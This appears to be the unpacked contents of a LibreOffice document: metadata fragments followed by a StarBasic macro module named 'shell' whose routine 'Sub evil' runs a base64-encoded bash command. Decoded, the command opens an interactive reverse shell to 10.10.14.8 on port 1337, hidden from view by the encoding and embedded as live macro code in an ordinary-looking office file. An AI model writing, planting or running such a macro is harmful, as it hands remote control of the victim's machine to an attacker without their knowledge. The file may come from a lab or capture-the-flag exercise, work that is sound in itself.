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sh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01:14:49.735956700</meta:creation-date>
    <dc:date>2025-03-23T01:21:20.146976500</dc:date>
    <meta:editing-duration>PT6M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1.2$Windows_X86_64 LibreOffice_project/d3abf4aee5fd705e4a92bba33a32f40bc4e56f49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ll"/>
</library:library>
</file>

<file path=Basic/Standard/shell.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="shell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
Sub evil

    Shell("bash -c 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgvMTMzNyAwPiYx | base64 -d | /bin/bash'")
   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